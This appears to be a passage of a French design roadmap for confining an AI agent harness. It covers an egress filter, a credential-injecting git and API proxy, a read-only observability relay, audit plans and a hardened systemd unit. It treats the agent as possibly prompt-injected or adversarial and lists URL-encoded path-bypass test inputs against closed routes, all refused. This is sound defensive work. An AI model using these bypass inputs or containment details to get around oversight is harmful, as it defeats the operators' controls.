15. **Un `tofu apply` qui touche la configuration cloud-init régénère les clés d'hôte de la VM**, et ce n'est pas une anomalie : mesuré à l'occasion d'un changement de `dns_servers` — la VM n'a **pas** été recréée (`/etc/machine-id` daté de la construction du gabarit, disque et déploiement intacts, plan « modify in place »), mais cloud-init a **rejoué** au boot suivant (nouvel *instance-id*), a réécrit netplan, et son module `ssh` a **supprimé puis régénéré les clés d'hôte** (`ssh_deletekeys` vaut `true` par défaut, précisément pour éviter les clés dupliquées entre clones). Conséquence pratique : après un tel apply, tout outil qui **épingle** la clé d'hôte de la VM la voit changer (`ssh-keygen -R <ip>` sur un `known_hosts`) ; le harnais réglé par `ssh_deletekeys: false` dans le user-data si c'est gênant. **Le broker n'en dépend pas** : la clé qu'épingle la zone agent est la **sienne** (`/etc/git-broker/ssh_host_ed25519_key`), sur le disque avec le déploiement — vérifié, le `ls-remote` du harnais fonctionne après le redémarrage.

**Risques résiduels.**

1. **Les liens LFS dépendent de la forge** : Forgejo/Gitea les construisent depuis l'hôte de la requête depuis 1.25.4, avant depuis `ROOT_URL`. Les deux entrées HTTP présentent donc le **nom de la forge** — ce qu'un frontal qui route par nom (Traefik, ici) accepte, et que l'agent n'a pas à connaître — les liens arrivent avec ce nom, et les **trois** formes qu'ils peuvent porter — alias, nom de la forge, endpoint loopback avec son port — sont réécrites vers le proxy (quatre règles : le nom de la forge compte pour **deux**, le lien portant le scheme de sa `ROOT_URL`, pas celui du proxy) : c'est ce qui ramène le transfert, donc le credential, sur le loopback **sans** que l'agent en détienne un. À vérifier en premier sur la forge réelle : l'aller-retour LFS, puisque c'est désormais la réécriture du **nom** qui porte le transfert (mécanisme mesuré, cette base-ci non).
2. **GitHub et LFS** : GitHub délègue ses transferts LFS à S3 — un objet LFS ne passerait donc pas par ce broker (le stockage objet d'une forge auto-hébergée pose la même question). Ce n'est pas le broker qu'il faut élargir mais l'**egress** : déclarer le stockage dans `agent_egress_proxy_allowlist`. LFS est une histoire Forgejo/GitLab ; le transport git et l'API, eux, sont bien génériques.
3. **Un objet LFS traverse nginx** : corps non borné et délai long **sur cette entrée seulement** (l'API garde ses bornes). C'est le prix direct de LFS.
4. **Deux nouvelles portes loopback** (`2222`, `8002`), comme l'était `8001` : la Phase 7 doit les connaître, et toute écoute supplémentaire devra entrer dans `agent_egress_blocked_loopback_ports` ou authentifier ses appelants.
5. **Le relais est atteignable depuis la zone agent** : sa surface reste *un* verbe, et la commande transmise est **reconstruite** depuis le dépôt déclaré — jamais rejouée telle qu'elle est arrivée. Tout second verbe (API, shell, forward) ouvrirait la même question.
6. **Le PAT porte toute l'autorité du compte** : le bornage vient de ses *permissions* sur la forge (un writer ne devient pas admin), de la protection de branche, **et des chemins/verbes que le proxy route** — l'API du compte n'est pas atteignable depuis la zone agent, même avec un jeton valide. `PATCH` sur `/pulls` et `/issues` (au défaut, cf. `git_broker_api_proposal_methods`) laisse l'agent modifier ou fermer une pull request — la sienne comme celle d'un humain, la forge n'ayant pas de permission par objet : dommage borné au dépôt déclaré et réversible par un humain, là où les réglages du dépôt (protection de branche comprise) restent hors d'atteinte, le préfixe nu étant en lecture seule.
7. **Les tags** doivent être protégés côté forge, sinon un tag poussé par l'agent déclenche un pipeline de déploiement — même raisonnement que la branche.
8. **La clé d'hôte de la forge est épinglée** : si la forge change de clé, le broker casse jusqu'à mise à jour — la panne est voulue, et le message du contrôle d'effet dit quoi regarder.
9. **Refus SSH après acceptation de la clé : c'est la pénalité de source d'OpenSSH, et c'est mesuré.** L'`sshd` **système** tourne avec les défauts d'OpenSSH 10.2 (`persourcepenalties crash:90 authfail:5 noauth:1 … min:15 max:600`) et son journal porte **17** événements `srclimit_penalise: ipv4: new 10.20.1.250/32 deferred penalty of 5 seconds for penalty: failed authentication`, horodatés à l'identique des deux refus subis (14:12:19, puis la séquence de 14:25). Côté client la trace est `Server accepts key` **deux fois** puis refus : la clé *proposée* est connue du serveur (PK_OK), c'est la connexion qui est ensuite différée. **fail2ban est hors de cause** (`Total failed: 0`, `Currently banned: 0`, `ignoreip` en place). Ce n'est donc pas un défaut du dépôt, mais un effet de bord des **essais de vérification** : une connexion qui n'authentifie pas compte comme un échec, chaque échec ajoute 5 s de pénalité, et un client qui réessaie (agent SSH vide, `BatchMode=yes`) **entretient** la pénalité — d'où des blocages de plusieurs minutes. Conséquence pratique : vérifier depuis un client dont l'identité est disponible du premier coup, et en cas de refus **attendre** plutôt que réessayer.
10. **Les redémarrages de cette VM se bloquent par intermittence** (11 s une fois, deux arrêts figés de plusieurs minutes le même jour) : c'est le défaut d'affichage/DRM de la VM, pas du dépôt. `system_reboot_on_kernel_update: false` permet à un play d'aboutir **sans** en déclencher un, ce qui est la seule façon de vérifier sur une machine qui ne survit pas toujours à son propre reboot. *(Le 19/09, deux redémarrages — 19:08 et 19:10, déclenchés par un apply de provisioning — sont passés proprement. Le déploiement a par ailleurs basculé `vga_type` de `qxl` à `virtio` dans `iac/variables.tf` : modification **non commitée** à ce jour, et c'est le remède habituel au blocage DRM de QXL.)*
11. **`/run/sshd` appartient d'abord à l'`sshd` de la distribution** : le rôle le crée (idempotent) si besoin, mais sur une machine où `ssh.service` serait masqué, le répertoire manquerait **au démarrage** et l'unité du broker échouerait (`status=226/NAMESPACE`) jusqu'au prochain play. Non traité par `RuntimeDirectory`, qui l'aurait supprimé à l'arrêt — cassant les sessions neuves de l'administrateur, sur cette même VM.
12. **L'entrée de lecture donne à l'agent tout ce que la forge expose sous le préfixe du dépôt déclaré** — hooks, collaborateurs, noms des secrets CI, **logs de jobs** (qui contiennent régulièrement des secrets partiellement masqués) — alors que le contenu du dépôt lui est déjà lisible par `git-upload-pack`. Élargissement **assumé** (le flux PR n'a besoin que de `/pulls` et `/issues`, mais l'état de la CI a été jugé utile à un agent SRE) : c'est le premier rétrécissement à envisager, et il ne coûte qu'une ligne de `git_broker_api_read_locations`.
13. **Le proxy d'injection partage l'uid de la zone de confiance.** Il parse des réponses forgées par l'amont et il est joignable depuis la zone agent : une compromission de nginx lit donc ce que cet uid peut lire, c'est-à-dire aussi les fichiers des autres composants. Partagé **par décision** — un compte par composant n'a été retenu que là où le composant a besoin de sa propre *forme* de compte (le shell du broker git). Compensation en place : le service n'écrit que dans son répertoire d'exécution, plus dans le home commun.
14. **Le verbe push vaut exécution de CI côté forge** : la protection de branche ne couvre pas une branche **neuve**, donc une modification de `.forgejo/workflows/` y fait tourner un runner — machine hors de la zone agent, avec son propre egress et souvent les secrets du dépôt, que le filtre d'egress de la zone agent ne couvre pas. À traiter dans le même document que la protection de branche : chemins de workflow protégés, ou secrets tenus hors des runs qu'un acteur non listé peut déclencher (README, « On the forge »).

#### ✅ Relais d'observabilité — Prometheus, Alertmanager, Grafana *(faite, suite de la Phase 5)*

**Cas d'usage : agent SRE.** Il lit un cluster (Phase 4) et propose un changement (Phase 5), mais il est **aveugle sur l'état de ce qu'il exploite** : qu'est-ce qui sonne, quelles cibles sont tombées, quel dashboard décrit ce service. La pile tourne **dans le cluster visé**, joignable par nom (`<outil>.captaindartz.org`, TLS Let's Encrypt — donc rien à distribuer côté autorité), et la zone agent ne l'atteint pas : sa seule sortie est le loopback.

**Le primitif suffisait, à une clause près.** Une entrée de `token_proxy_injections` donne déjà la porte loopback, les préfixes admis, la méthode unique, les chemins fermés par leur nom et la vérification TLS. Manquait une seule chose : **il exigeait un en-tête portant un jeton** — or Prometheus et Alertmanager **n'ont pas d'authentification**, et ce n'est pas un choix de déploiement mais le logiciel : leur API est anonyme, et ce qu'on met devant eux (Basic d'ingress, proxy d'authentification, `web.config.file`) est un ajout. Le primitif accepte donc une entrée **sans credential** : l'assertion qui valide un credential ne boucle plus que sur les entrées qui en déclarent un, le template referme son bloc d'injection dans un `{% if %}`, et l'`Authorization` de l'agent est **effacé dans tous les cas** — l'invariant ne dépend pas de ce qu'on injecte.

- [x] **Une entrée par service, déclarée — pas un composant de plus** : `observability_relay` n'installe rien (aucun template, aucune unité, aucun handler) et n'a donc **pas de bloc `disabled:`**. C'est le nettoyage de liste du primitif qui retire les blocs d'une entrée qui cesse d'être déclarée — propriété vérifiée à la désactivation, pas supposée.
- [x] **Le verbe est la fermeture** : `allowed_methods: ['GET']` sur les trois. Un silence Alertmanager (`POST /api/v2/silences`) ou une annotation Grafana tombent donc **par la méthode**, pas par une règle qu'il faudrait maintenir — la lecture seule est une propriété, pas une liste à tenir à jour.
- [x] **Trois lectures fermées par leur nom**, parce que c'est les lire qui est dangereux : `/api/datasources/proxy` chez Grafana (une seule location ouvre une requête vers **toutes** les sources configurées), `/api/v1/status/config` et `/api/v1/admin` chez Prometheus (la config chargée peut porter des credentials de scrape ou de remote-write, et l'API admin écrit le TSDB), `/api/admin` chez Grafana.
- [x] **Le jeton de Grafana est le seul credential**, et sa borne est côté amont : un **compte de service au rôle Viewer**, restreint aux dossiers voulus — comme le RBAC est la borne du broker k8s. Une ligne, dans `files/grafana.token`, hors dépôt.
- [x] **`read_timeout: 120s` sur Prometheus et Grafana** : une `query_range` ou une requête de source de données dépassent le défaut de 60 s. Alertmanager répond vite et garde le sien.
- [x] **Ni `ca_src` ni `host_header`** : Let's Encrypt chaîne au bundle système déjà utilisé par défaut, et le `Host` par défaut (`$proxy_host`) porte le nom que le certificat vérifie — c'est aussi le bon SNI.
- [x] **Recouvrement avec le broker k8s, tranché** : les trois vivent dans le cluster, donc la sous-ressource `…/services/<svc>:<port>/proxy/…` les atteindrait — mais le broker **la refuse par son nom** (`--reject-paths`), délibérément. Rouvrir `proxy` ouvrirait tout le cluster d'une seule route ; le relais ouvre trois préfixes. **Relais choisi.**
- [x] **Pas de serveur MCP** — la raison et la condition de retour sont au §4.

**Les bornes ne se ressemblent pas, et il faut le dire tel quel.** Pour Grafana, la borne est le rôle du compte de service ; pour Prometheus et Alertmanager, **il n'y en a aucune côté amont** : la liste de préfixes et la méthode sont *toute* la borne. Le relais borne donc ce que l'agent peut **demander**, pas ce que ces services répondent à un client anonyme. Ce qu'il voit ensuite — cibles, labels, métriques, alertes, dashboards — est réel et sans secret par construction, mais des labels portent des noms d'hôtes, de services et d'images.

**Le premier déploiement a échoué, et le diagnostic se trompe deux fois de coupable** — d'où cette ligne, qui vaut plus que la correction :

| Constat | Mesure | Suite |
|---|---|---|
| Les deux relais publics répondent **502** à la sonde du primitif | `upstream SSL certificate verify error: (20:unable to get local issuer certificate)`. Ni le magasin d'autorités (`openssl s_client -CAfile` **et** `curl` valident la même chaîne, y compris en tant qu'utilisateur de la zone de confiance et avec `-no-CApath`), ni le durcissement de l'unité (un nginx minimal, **root, sans bac à sable**, échoue à l'identique). Le journal `debug` de nginx donne le vrai point d'arrêt : `error:22, depth:2, subject:"Root YR", issuer:"ISRG Root X1"`. | **Défaut d'nginx, pas du relais** : `proxy_ssl_verify_depth` vaut **1** par défaut, or la chaîne Let's Encrypt 2026 (`feuille → YR1 → Root YR → ISRG Root X1`) fait résoudre le dernier maillon **depuis le magasin** : mesuré, elle exige **2** (1 → 502, 2 → 403, 3 → 403). Corrigé dans le **primitif** : `proxy_ssl_verify_depth` est émis sur tous les blocs, avec `token_proxy_ssl_verify_depth: 5` pour la marge. Sans cela, tout amont à chaîne Let's Encrypt aurait échoué — le broker git, à chaîne interne plus courte, ne change pas de comportement. |
| **`git_broker_injections` ignorait `git_broker_enabled`** : broker éteint, ses **trois blocs forge** étaient quand même servis par le proxy | **Confirmé par la mesure** : les déclarations intactes et `-e git_broker_enabled=false` → `git_broker_injections` = 3, amonts servis = la forge ×3 **puis** les trois relais. La moitié SSH, elle, était bien démontée par le bloc `disabled:` du rôle — donc le déployeur croyait le broker éteint pendant que le jeton de la forge partait sur le loopback. **Atteignable seulement depuis ces relais** : tant que `git_broker` était le seul consommateur du primitif, `token_proxy_enabled` l'impliquait de fait. | **Corrigé** : `(git_broker_enabled \| bool)` entre dans les trois conditions (et dans `git_broker_lfs_deployed`, qui en hérite) — les prédicats des relais le faisaient déjà, c'était l'incohérence. Mesuré après : **0** bloc forge éteint, **3** rallumé, et les relais restent servis dans les deux cas : les deux capacités sont indépendantes, ce qui était le but. |

**Mesuré sur la VM, le 21/09/2026** — six blocs déployés (les trois du broker git, les trois relais) :

| Contrôle | Résultat |
|---|---|
| Sondes du primitif | **200** sur les trois — la troisième (`/api/search`) prouve le jeton Grafana injecté **et accepté** |
| Lectures | `query?query=up` **200** ; `/api/v2/alerts?active=true` **200** (1 055 octets d'alertes réelles) ; `/api/search?type=dash-db` **200** (8 140 octets de dashboards) |
| Écritures | `POST /api/v2/silences` **403**, `DELETE /api/v2/silences/1` **403**, `POST /api/annotations` **403** — refus par la **méthode**, pas par une règle |
| Chemins fermés | `/api/datasources/proxy/1/…` **403**, `/api/v1/status/config` **403**, `/api/v1/admin/tsdb/snapshot` **403**, `/api/admin/settings` **403** |
| Bornes de préfixe | `/autre` **404** *par le proxy* (aucun préfixe ne matche) ; `/api/v1x/query` **404** *par Grafana* — le préfixe le plus long qui matche est son `/api/`, donc c'est lui qui répond, et sans lui déclaré ce serait un 404 du proxy |
| L'en-tête de l'agent ne passe pas | `Authorization: Bearer bidon` → **200** quand même sur les trois : remplacé chez Grafana, **effacé** chez les deux qui n'injectent rien |
| Idempotence | second passage à configuration identique : **`changed=0`** |
| Désactivation (`observability_relay_enabled: false`) | **`changed=3`** et les blocs 4-6 **disparaissent** ; l'agent reçoit **404**. Le rôle déclarant n'a donc bien **pas besoin de teardown** : c'est le nettoyage de liste du primitif. *(Piège associé : en `-e`, la forme `-e observability_relay_enabled=false` passe la chaîne `"false"` et le play refuse — cf. la note des flags `*_enabled` en Phase 1.)* |
| Trace | `journalctl -u token-proxy` : une ligne par requête, code et taille compris |

**Le banc adverse de la revue, sur les nouveaux chemins fermés** : `/api/datasources%2Fproxy/1/…` → **403** — le matching de `location` **décode** `%2F`, que la map laisse pourtant passer puisqu'il est un séparateur légitime pour GitLab ; tout encodé (`/api%2Fv1%2Fstatus%2Fconfig`) → **403** ; `//api/datasources/proxy/…` (slashes fusionnés) → **403** ; double encodage → **403** par la map. Aucune des formes n'ouvre le tunnel, et `nginx -t` passe sur les six blocs. C'est le pendant heureux du garde de merge : là où `merge$` laissait passer un slash final, ici c'est la normalisation qui **travaille pour** le garde. `HEAD` passe avec `GET` — même lecture, sans conséquence.

**Un blocage d'environnement, à retenir** : le premier déploiement a buté sur l'**ingress**, qui refusait la plage d'adresses de la VM — `403 Forbidden` sur les trois noms et sur *toutes* les routes, alors que le même chemin répondait 200 depuis un autre poste. Aucun credential n'y remédie : c'est l'**adresse** qui est filtrée, et le relais ne parle à l'amont que depuis l'adresse de la VM. Corrigé côté ingress — et c'est la bonne lecture des bornes : la restriction réseau reste le contrôle le plus fort pour deux services qui n'authentifient personne.

**Le risque à surveiller est le volume.** Une `query_range` peut rendre des dizaines de milliers de points : le relais borne le transport, pas le contexte du modèle. Si la mesure le montre, la réponse sera **un** outil de synthèse (« ce qui est en feu », « quelles cibles sont down »), pas une API réécrite en outils.

### Hygiène

#### 🌟 Phase 6 — Chaîne d'approvisionnement

- [ ] **`runsc` vient maintenant d'un dépôt apt tiers signé** (corrigé le 20/09/2026) : apt vérifie la signature du dépôt et les sommes des paquets, donc l'épinglage par `checksum:` n'a plus d'objet — restent deux points à trancher ici : la **priorité** du dépôt gVisor (500, comme `universe`, qui livre aussi un `runsc` : apt prend la version la plus haute, `20260914.0` contre `0.0~20240729.0-7`) et le sort de la **clé** versée dans `/etc/apt/keyrings`. Idem pour les installeurs `uv` et NVM, eux toujours téléchargés sans vérification.
- [ ] Images conteneurs : épingler les digests ; envisager un miroir interne + politique `cosign`.
- [ ] Les `pip install` / `npm install` sont un point d'entrée pour un agent injecté : au minimum les journaliser, idéalement les restreindre à un miroir. Concerne aussi **`npm update -g`**, que `nvm` lance **sans condition à chaque run** (constaté en Phase 1) — c'est ce qui oblige à lever le filtre d'egress pendant le provisioning.
- [ ] **Rôle d'image locale : la boîte à outils de l'agent, construite avant la fermeture du filtre.** La zone agent ne peut pas tirer d'image (mesuré le 20/09/2026 : ni résolution de nom, ni `pull`), et si les commandes de l'agent s'exécutent dans des **conteneurs**, l'image *est* son outillage — sans elle il n'a qu'un shell nu. Le rôle construit donc une image locale : base épinglée par digest, liste d'outils **déclarée en variable** (kubectl, git, curl, jq, ripgrep… un déploiement ajoute sans toucher au dépôt), et il doit se placer **avant `agent_egress`** dans `playbook.yml` pour construire pendant la fenêtre de provisioning — c'est ce qui rend le runtime *sans* egress, et c'est la réponse de fond au `pull` impossible consigné en Phase 7. **À construire sous l'uid de l'agent** : bâti par root, l'image atterrit dans le store de root, que l'agent ne voit pas — c'est exactement ce qui m'a obligé à `save` par root puis `load` par l'agent pour prouver gVisor.
- [ ] **Ce que le conteneur doit lire des artefacts de la zone agent — et ce qu'il faut mesurer.** Rootless, le root du conteneur est mappé sur une plage subuid (`165536+`), pas sur l'uid de l'agent : les artefacts en `0600` du propriétaire 1001 lui sont donc **illisibles** tels quels. Trois voies, **à mesurer sur la VM** plutôt qu'à supposer : `--userns=keep-id` (le conteneur tourne en 1001 — que le filtre couvre déjà, comme il couvre la plage subuid), `:U` au montage (qui **chown** les fichiers de l'hôte, que le play suivant reprendrait : les deux se combattraient), ou **préintégrer** les fichiers dans l'image (simple pour le harnais, mais un rebuild à chaque changement et Ansible cesse d'être l'unique écrivain). Les artefacts concernés sont ceux que les brokers écrivent déjà : `~/.ssh/config` (l'alias du relais), la clé **factice** et son `known_hosts`, `~/.gitconfig` (la réécriture LFS) et `~/.kube/config` (l'adresse du broker, `token: ignore`).
- [ ] **L'environnement du proxy L7 doit vivre à trois endroits, pas un** — parce qu'aucun des trois n'est un shell de connexion, donc aucun ne le reçoit tout seul : **(a) le harnais lui-même**, dont les outils web (`web_fetch`, `web_search`) tournent **hors conteneur**, dans son propre processus → c'est l'unité de la Phase 8 qui doit porter `Environment=` ou `EnvironmentFile=` ; **(b) les conteneurs qu'il lance** → l'image, ou le `podman run` ; **(c) les shells de connexion de l'agent** → ce que fait déjà `/etc/profile.d/egress-proxy.sh`, et seulement eux (mesuré). **Ce qui ne suffit pas pour autant** : il faut que la pile HTTP du client *lise* ces variables. `curl`, `requests`/`httpx` et le transport par défaut de Go les lisent ; le `fetch` natif de Node ne les lit pas sans activation explicite — un `web_fetch` en Node ignorerait donc le proxy, et comme la zone agent n'a **aucun** autre chemin, l'outil échouerait sur une configuration invisible. À vérifier par harnais, en Phase 8.
- [ ] **Le contrat avec la Phase 8, écrit une fois pour les deux.** Nom et tag de l'image, montages, `--userns`, `--network=host` — obligatoire, sans le netns de l'hôte le conteneur voit son propre loopback et n'atteint aucune des portes (`2222`, `4000`, `8001`, `8002`, `8080`) — et l'environnement. À écrire dans le README à côté du contrat de l'agent, sinon le harnais et le rôle d'image divergeront.
- [ ] **Question à trancher en Phase 8 : que garde le harnais sur l'hôte ?** S'il ne fait qu'orchestrer des `podman run`, l'outillage de la zone agent sur l'hôte (`uv`, `nvm`, configs git…) devient largement superflu — un rétrécissement de surface intéressant, à condition de ne pas casser son propre runtime.

#### 🌟 Phase 7 — Observabilité & vérifications

À faire **avant** d'installer le harnais (Phase 8) : rien ne doit tourner sans être audité.

- [ ] Règles auditd `execve` sur l'uid du harnais : rend visible l'exploitation d'une injection en RCE.
- [ ] Logs des composants de la zone de confiance **et du proxy L7** → cible commune, **non inscriptible par la zone agent**. Principal artefact de détection d'exfiltration — **piste d'audit des prompts comprise**, que le gateway ne fournit pas aujourd'hui (`DETAILED_DEBUG` n'est qu'un flux de débogage, 135 lignes par requête). Le proxy produit déjà sa part (une ligne de politique par requête, `egress-allow`/`egress-deny`) : reste à l'expédier.
- [ ] Expédition distante des logs (une VM compromise ne doit pas pouvoir effacer ses traces).
- [ ] **Le contrôle de santé du README suppose l'image déjà en cache** : sur une zone agent filtrée, `docker run --rm alpine …` ne peut pas *tirer* l'image — le registre n'est pas dans l'allowlist du proxy L7, et l'environnement du proxy n'existe que dans les shells de connexion. Mesuré le 20/09/2026 : le conteneur ne démarre que si l'opérateur a pré-tiré l'image (la preuve gVisor a été faite en exportant l'image par `root`, puis en la chargeant par l'agent, sans réseau). **La réponse de fond est en Phase 6** : une image locale bâtie *pendant* la fenêtre de provisioning, l'image remplaçant le registre plutôt que le registre s'ouvrant.
- [ ] Auditer ce que les routes d'admin du gateway exposent à l'agent (`/health`, `/metrics`, `/key/*`) : chemin connu depuis la Phase 2, impact faible sans base de données, mais c'est un chemin que l'agent a.
- [ ] `make audit` qui **assère** l'état réel : règles d'egress (et **table `agent_egress` chargée** — sans quoi un run interrompu laisse la zone agent ouverte sans le dire), UFW, **`inference-gateway` actif sous l'utilisateur de la zone de confiance**, durcissement des unités, absence de credential hors zone de confiance.
- [ ] Alerting sur anomalies (nouvelle destination, upload volumineux, nouveau processus).

### Harnais

#### 🌟 Phase 8 — Installation et sécurisation du harnais

**Périmètre.** Le socle ne présuppose rien du harnais et **ne l'installe pas** : il sécurise l'environnement d'exécution autour de lui. L'installation est déléguée à un **provider interchangeable**, sur le même patron que la table d'alias pour l'inférence.

- `harness_provider: "hermes"` → le rôle `harness_hermes` livré par le projet installe le harnais et définit `harness_exec_start` par défaut.
- `harness_provider: "none"` → installation manuelle : le déployeur installe son harnais et renseigne `harness_exec_start`.
- Un `harness_exec_start` explicite **l'emporte toujours** sur le défaut du provider.

**Ajouter la compatibilité d'un autre harnais** — le chemin prévu, pas un contournement : ajouter `roles/harness_<nom>/` qui installe le harnais et pose `harness_exec_start`, puis `harness_provider: "<nom>"`. Le rôle `harness_service` reste **inchangé** : c'est ce découpage qui garde le socle agnostique. Le projet ne livre que `hermes`, volontairement.

**Pourquoi cette phase en dernier.** L'unité systemd n'est le prérequis d'aucune autre phase : le contrôle d'egress (Phase 1) travaille sur l'**uid**, pas sur le service. La déplacer ici permet d'écrire un `ExecStart` qui pointe sur quelque chose de réellement installé, et de vérifier le durcissement obtenu sur une unité qui démarre.

- [ ] **Arrêter le harnais avant de lever le filtre d'egress** — décision du déploiement, et elle remplace la piste « déplacer la levée dans le rôle `nvm` avec un `block`/`always` » (écartée : elle impose un contrat par rôle à retenir, et la levée au niveau du play redeviendra nécessaire pour les mises à jour). Le play lève le filtre pour toute sa durée ; sans harnais en marche, la fenêtre cesse d'être **exploitable** — un agent antagoniste peut guetter une porte ouverte, pas s'en servir si on l'a arrêté. Et le mode d'échec s'inverse : un play interrompu laisse l'agent **arrêté** jusqu'au prochain run, au lieu d'un agent **non filtré** — *fail-closed* au lieu de *fail-open*. À arrêter : `{{ agent_name }}.service` **et ce qu'il a lancé** (ses conteneurs tournent sous ses uid subordonnés, un `systemctl stop` ne les touche pas). Le redémarrage vient **après** la réapplication du ruleset, en dernier geste du play.
- [ ] **Créer le rôle `harness_hermes`** — il n'existe pas aujourd'hui : `hermes` n'apparaît dans le dépôt que comme *nom de provider* (`harness_provider`) et exemple du README, jamais comme installation. Rôle à concevoir **au moment de cette phase** et pas avant : il n'est le prérequis d'aucune autre, et ses deux paramètres déterminants ne sont pas connus à ce stade.
  - À trancher alors : le **mécanisme d'installation** (dépôt git à cloner, `uv tool install` / `pipx` / `npm -g`, binaire…) et l'**entrypoint** réel (`harness_exec_start`).
  - Il doit installer dans la zone agent et poser `harness_exec_start` + `harness_workdir` par défaut. **Seul provider livré**, volontairement.
- [ ] Documenter la convention de provider (§ ci-dessus) et les **exemples** d'`harness_exec_start` pour d'autres harnais — en commentaire, jamais comme défaut.
- [ ] Rôle `harness_service` : unité `{{ agent_name }}.service`, tout en variables. Indépendant du provider.
- [ ] **Cette unité doit porter l'environnement du proxy L7 elle-même** : `/etc/profile.d/egress-proxy.sh` ne parle qu'aux shells de connexion (son propre commentaire le dit), et un service systemd ne source rien de tel — sans `Environment=` (ou `~/.config/environment.d/` pour un service *user*), le harnais n'aura aucun chemin d'egress. **Y compris pour ses propres outils web** : `web_fetch` et `web_search` sont exécutés par le harnais, pas par un `podman run` — l'environnement des conteneurs ne les couvre pas.

```ini
[Unit]
Description=AI Agent Harness ({{ agent_name }})
After=network-online.target

[Service]
Type=simple
User={{ agent_name }}
Group={{ agent_name }}
WorkingDirectory={{ harness_home }}
ExecStart={{ harness_exec_start }}      # ex. /usr/local/bin/uv run python main.py
Restart=always
RestartSec=5

# Sandboxing systemd strict
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths={{ harness_home }}/workspace
PrivateTmp=true
PrivateDevices=true
ProtectProc=invisible
ProcSubset=pid
NoNewPrivileges=true
CapabilityBoundingSet=
ProtectKernelTunables=true
ProtectControlGroups=true
RestrictNamespaces=true
RestrictRealtime=true
RestrictSUIDSGID=true
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6
SystemCallFilter=@system-service
SystemCallArchitectures=native
LockPersonality=true
RemoveIPC=true
UMask=0077
MemoryMax=8G
CPUQuota=400%
TasksMax=2048

# Egress : loopback uniquement — complète la Phase 1 (survit aux changements d'uid)
IPAddressDeny=any
IPAddressAllow=localhost

[Install]
WantedBy=multi-user.target
```

- [ ] **Le harnais exécute ses commandes dans un conteneur** (constat de la Phase 4) : l'outillage vit donc dans **l'image**, pas dans la zone agent — un `kubectl` installé nu ne servirait à rien. C'est l'image qui porte le client du broker, et elle n'atteint les services loopback (broker, proxy L7) qu'en `--network=host`, avec le `$HOME` du harnais monté (kubeconfig bidon, variables de proxy). À trancher ici : le provider livre-t-il une image par défaut, ou documente-t-il seulement la recette ?
- [ ] **Reprendre l'environnement du proxy dans l'unité** : `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY` et, au niveau 2, `SSL_CERT_FILE`/`REQUESTS_CA_BUNDLE`/`NODE_EXTRA_CA_CERTS`. `/etc/profile.d` n'atteint ni une unité systemd ni une session SSH non interactive (`ssh harnais@vm "curl …"`) — le fichier de profil de `agent_egress_proxy` ne sert qu'aux sessions interactives. À vérifier aussi : que la pile HTTP du harnais honore réellement ces variables.
- [ ] Mettre à jour le sudoers scopé (`systemctl restart {{ agent_name }}`) : déployé par `agent_user`, il référence une unité qui n'existe qu'à partir d'ici.
- [ ] `security_hardening` copie les `authorized_keys` de l'admin vers le harnais (même clé pour `ubuntu@` **et** `{{ agent_name }}@`) : rendre ce comportement **optionnel**, et documenter que ça fusionne les identités.
- [ ] **Vérifier le durcissement obtenu** : `systemd-analyze security {{ agent_name }}.service`, avec un score cible documenté. (C'est le bon endroit pour cette mesure : elle porte sur l'unité créée ici.)
- [ ] `harness_service_enabled: false` doit laisser la VM dans son état actuel (la sandbox complète, sans service).

### Outillage

#### 🌟 Phase 9 — Raccourcis développeur (`Makefile`)

- [ ] `make deploy` : `tofu apply` puis `ansible-playbook`.
- [ ] `make lint` : `tofu fmt -check`, `tofu validate`, `ansible-lint`.
- [ ] `make ssh` : SSH en tant que harnais.
- [ ] `make restart` : redémarre le service du harnais (nécessite la Phase 8).
- [ ] `make audit` : lance les vérifications de la Phase 7.

---

## 🚫 4. Décisions écartées (et quand les revisiter)

| Écarté | Raison | Condition de retour |
|---|---|---|
| Interception TLS (MITM) **par défaut** | Coût de distribution de la CA dans tous les trust stores (système, `certifi`, `NODE_EXTRA_CA_CERTS`, git, kubeconfig) + cert pinning cassé. | **Retenue comme niveau 2 opt-in** (Phase 3), pas comme défaut. Le niveau 1 (allowlist) couvre la majorité des cas. |
| Résolveur DNS en zone de confiance | Annoncé en Phase 1, il ne sert rien : un client derrière un proxy *forward* envoie le **nom** dans sa requête CONNECT, c'est le proxy qui résout. Et un client qui résoudrait pour se connecter lui-même n'a de toute façon aucune IP hors loopback à joindre — il échouerait après avoir résolu. Un composant de plus pour zéro capacité. | Le jour où un client exigerait une résolution préalable **et** un chemin réseau hors loopback qui ne passe pas par le proxy. |
| Migration complète UFW → nftables | UFW gère bien l'ingress, est déployé, et fail2ban utilise son action `ufw`. | Jamais nécessaire : les deux coexistent (Phase 1). |
| Retirer la loopback (`127.0.0.1/8`) de `fail2ban ignoreip` | La prison est en `mode = aggressive` : une connexion qui **ne s'authentifie pas** compte déjà comme un échec, donc cinq clés proposées par la zone agent poseraient un ban UFW sur `127.0.0.1` qui couperait **tout** l'accès loopback au port 22 — celui de l'opérateur comme les sessions loopback du play. Ce qui rend l'exemption inoffensive : `AuthenticationMethods publickey` + `PasswordAuthentication no`, il n'y a donc rien à deviner, seulement à limiter — et l'`sshd` système garde pour cela les pénalités de source d'OpenSSH 10 (`authfail:5`, mesurées au §5). | Le jour où une authentification par mot de passe serait activée : l'exemption loopback et elle ne peuvent pas coexister (`security_hardening_ssh_password_authentication`). |
| Vault / OpenBao / SPIFFE / OIDC apiserver | Se justifie quand il y a des secrets d'infrastructure à protéger. Complexité non testée = risque en soi. | Le jour où un vrai secret entre dans le périmètre. |
| Kyverno / OPA Gatekeeper côté cluster | En lecture seule, n'apporte rien. | Le jour où l'agent obtient un **verbe d'écriture** (le RBAC ne peut pas inspecter le contenu d'un manifeste : avec `create pods`, un pod `privileged` + `hostPath: /` possède le nœud). |
| Second VM pour la zone de confiance | Frontière interne faible, compensée par l'absence de secrets. | Quand un secret d'infrastructure entre dans le périmètre. |
| Outbox + broker de branches (`git am`, `format-patch`) | Surdimensionné : en GitOps, une branche est inoffensive. L'invariant est « pas de droit d'application ». La validation se fait en CI sur la PR (Phase 5). | Si le harnais doit agir **sans validation humaine** — aucun proxy ne peut distinguer une bonne proposition d'une mauvaise. |
| `kube-rbac-proxy` | Authentifie l'**appelant** avec le jeton de l'appelant → le harnais devrait *avoir* un jeton. | — |
